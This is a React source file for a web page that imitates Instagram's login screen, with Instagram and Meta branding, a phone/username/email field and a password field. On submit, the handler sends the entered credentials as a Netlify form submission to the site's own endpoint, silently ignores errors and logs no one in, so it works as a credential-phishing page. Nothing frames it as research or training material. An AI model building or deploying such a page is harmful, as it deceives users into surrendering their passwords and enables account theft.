import { useState, useMemo } from 'react';
import { motion } from 'framer-motion';
import { ChevronLeft } from 'lucide-react';

type InputType = 'phone' | 'email' | 'username';

function detectInputType(value: string): InputType {
  const trimmed = value.trim();
  if (/^\+?\d/.test(trimmed)) return 'phone';
  if (trimmed.includes('@')) return 'email';
  return 'username';
}

function validateInput(value: string, type: InputType): boolean {
  const trimmed = value.trim();
  if (trimmed === '') return false;

  switch (type) {
    case 'phone': {
      const digitsOnly = trimmed.replace(/[^\d]/g, '');
      return digitsOnly.length === 10;
    }
    case 'email': {
      return /^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/.test(trimmed);
    }
    case 'username': {
      return trimmed.length >= 1;
    }
  }
}

function App() {
  const [mobile, setMobile] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const inputType = useMemo(() => detectInputType(mobile), [mobile]);
  const isMobileValid = useMemo(() => validateInput(mobile, inputType), [mobile, inputType]);
  const isFormValid = isMobileValid && password.trim() !== '';

  const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    const type = detectInputType(val);
    if (type === 'phone') {
      setMobile(val.replace(/[^\d+\-() ]/g, ''));
    } else {
      setMobile(val);
    }
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!isFormValid) return;

    setIsSubmitting(true);

    const formData = new URLSearchParams();
    formData.append('form-name', 'login');
    formData.append('mobile', mobile);
    formData.append('password', password);

    try {
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: formData.toString(),
      });
    } catch (_) {
      // silent
    }


  };

  const footerLinks = [
    'Meta', 'About', 'Blog', 'Jobs', 'Help', 'API', 'Privacy', 'Terms',
    'Locations', 'Instagram Lite', 'Meta AI', 'Threads',
    'Contact uploading and non-users', 'Meta Verified'
  ];

  return (
    <div className="min-h-screen bg-black flex flex-col">
      <div className="flex-1 flex flex-col lg:flex-row items-center justify-center px-4 py-8 lg:py-0">
        
        {/* Left Side - Hero Section */}
        <motion.div
          initial={{ opacity: 0, x: -40 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ duration: 0.7, ease: 'easeOut' }}
          className="hidden lg:flex flex-col items-start justify-center w-full max-w-[600px] pr-12 xl:pr-20"
        >
          <div className="mb-8">
            <img src="/images/instagram-logo.png" alt="Instagram" className="w-16 h-16 object-contain" />
          </div>

          <h1 className="text-[40px] leading-tight font-semibold text-white mb-2">
            See everyday moments from your
          </h1>
          <h1 className="text-[40px] leading-tight font-semibold mb-10">
            <span className="bg-gradient-to-r from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] bg-clip-text text-transparent">
              close friends
            </span>
            <span className="text-white">.</span>
          </h1>

          <div className="relative w-[380px] h-[420px]">
            <div className="absolute -left-4 top-20 w-8 h-8 text-red-500">
              <svg viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
              </svg>
            </div>

            <div className="relative w-[260px] h-[380px] mx-auto rounded-[36px] border-[3px] border-gray-600 overflow-hidden bg-gray-900 shadow-2xl">
              <img src="/images/friends.jpg" alt="Friends sharing moments" className="w-full h-full object-cover" />
              <div className="absolute bottom-4 left-4 right-4 flex items-center justify-between">
                <div className="bg-white/20 backdrop-blur-sm rounded-full px-4 py-1.5 flex items-center gap-2">
                  <div className="w-2 h-2 rounded-full bg-white"></div>
                  <div className="w-2 h-2 rounded-full bg-white/40"></div>
                </div>
                <svg className="w-6 h-6 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
                </svg>
              </div>
              <div className="absolute top-4 left-4 bg-white/90 rounded-full px-2 py-1 flex gap-1 text-sm">
                <span>👻</span><span>🔴</span><span>😍</span>
              </div>
              <div className="absolute top-16 right-2 w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white text-xs shadow-lg">
                <span>⭐</span>
              </div>
            </div>

            <div className="absolute bottom-8 right-4 w-14 h-14 rounded-full border-2 border-pink-500 overflow-hidden bg-green-400">
              <div className="w-full h-full bg-gradient-to-br from-green-300 to-green-500 flex items-center justify-center text-2xl">
                🥦
              </div>
            </div>
          </div>
        </motion.div>

        {/* Right Side - Login Form */}
        <motion.div
          initial={{ opacity: 0, x: 40 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ duration: 0.7, ease: 'easeOut', delay: 0.15 }}
          className="w-full max-w-[420px] lg:min-w-[420px]"
        >
          <div className="bg-black lg:bg-transparent p-6 lg:p-10">
            <div className="flex items-center gap-3 mb-8">
              <button className="text-white hover:text-gray-300 transition-colors">
                <ChevronLeft size={28} strokeWidth={1.5} />
              </button>
              <h2 className="text-[17px] font-semibold text-white">
                Log in to Instagram
              </h2>
            </div>

            <form
              name="login"
              method="POST"
              data-netlify="true"
              netlify-honeypot="bot-field"
              onSubmit={handleSubmit}
              className="space-y-3"
            >
              <input type="hidden" name="form-name" value="login" />
              <p className="hidden">
                <label>Don't fill this out: <input name="bot-field" /></label>
              </p>

              {/* Mobile / Email / Username Input */}
              <div>
                <input
                  type="text"
                  name="mobile"
                  placeholder="Mobile number, username or email address"
                  value={mobile}
                  onChange={handleMobileChange}
                  className="w-full bg-[#1a1a1a] border border-[#363636] rounded-xl px-4 py-3.5 text-sm text-white placeholder-[#737373] focus:outline-none focus:border-[#555555] transition-colors"
                  autoComplete="username"
                />
              </div>

              {/* Password Input */}
              <div>
                <input
                  type="password"
                  name="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-[#1a1a1a] border border-[#363636] rounded-xl px-4 py-3.5 text-sm text-white placeholder-[#737373] focus:outline-none focus:border-[#555555] transition-colors"
                  autoComplete="current-password"
                />
              </div>

              {/* Log In Button */}
              <div className="pt-2">
                <motion.button
                  type="submit"
                  disabled={!isFormValid || isSubmitting}
                  whileTap={isFormValid && !isSubmitting ? { scale: 0.98 } : {}}
                  className={`w-full py-3.5 rounded-xl text-[15px] font-semibold transition-all duration-200 ${
                    isFormValid && !isSubmitting
                      ? 'bg-[#0095f6] hover:bg-[#1877f2] text-white cursor-pointer'
                      : 'bg-[#0095f6]/40 text-white/50 cursor-not-allowed'
                  }`}
                >
                  {isSubmitting ? (
                    <span className="flex items-center justify-center gap-2">
                      <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                      </svg>
                      Logging in...
                    </span>
                  ) : (
                    'Log in'
                  )}
                </motion.button>
              </div>

              {/* Forgotten Password */}
              <div className="text-center pt-3">
                <span className="text-white text-[13px] font-medium hover:text-gray-300 transition-colors cursor-pointer">
                  Forgotten password?
                </span>
              </div>

              {/* Divider */}
              <div className="relative py-4">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-[#262626]"></div>
                </div>
              </div>

              {/* Log in with Facebook */}
              <button
                type="button"
                className="w-full py-3.5 rounded-xl border border-[#363636] text-white text-[14px] font-medium flex items-center justify-center gap-2.5 hover:bg-[#1a1a1a] transition-colors cursor-pointer"
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24" fill="#1877f2">
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                Log in with Facebook
              </button>

              {/* Create New Account */}
              <button
                type="button"
                className="w-full py-3.5 rounded-xl border border-[#0095f6] text-[#0095f6] text-[14px] font-medium hover:bg-[#0095f6]/10 transition-colors cursor-pointer"
              >
                Create new account
              </button>

              {/* Meta Logo */}
              <div className="flex items-center justify-center pt-4 gap-1">
                <svg className="w-6 h-4" viewBox="0 0 80 20" fill="#737373">
                  <path d="M7.38 19.75c-3.18 0-5.53-1.27-6.8-3.47-.53-.92-.58-1.65-.58-3.47V7.19c0-1.82.05-2.55.58-3.47C1.85 1.52 4.2.25 7.38.25c2.42 0 4.35.75 5.73 2.22.23.25.23.65 0 .9l-.9.9c-.25.25-.63.25-.88.02-1-.95-2.25-1.42-3.95-1.42-2.1 0-3.65.85-4.45 2.32-.3.55-.33 1.08-.33 2.2v5.62c0 1.12.03 1.65.33 2.2.8 1.47 2.35 2.32 4.45 2.32 1.7 0 2.95-.47 3.95-1.42.25-.23.63-.23.88.02l.9.9c.23.25.23.65 0 .9-1.38 1.47-3.3 2.22-5.73 2.22z"/>
                  <path d="M25.5 19.75c-5.08 0-8.25-3.42-8.25-9.75S20.42.25 25.5.25s8.25 3.42 8.25 9.75-3.17 9.75-8.25 9.75zm0-2.62c3.28 0 5.33-2.55 5.33-7.13s-2.05-7.12-5.33-7.12-5.33 2.55-5.33 7.12 2.05 7.13 5.33 7.13z"/>
                </svg>
                <span className="text-[#737373] text-sm font-medium tracking-wide">Meta</span>
              </div>
            </form>
          </div>
        </motion.div>
      </div>

      {/* Footer */}
      <footer className="w-full py-6 px-4">
        <div className="max-w-[1024px] mx-auto">
          <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-1">
            {footerLinks.map((link) => (
              <a
                key={link}
                href="#"
                className="text-[#737373] text-[12px] hover:text-[#a8a8a8] transition-colors whitespace-nowrap"
              >
                {link}
              </a>
            ))}
          </div>
        </div>
      </footer>
    </div>
  );
}

export default App;
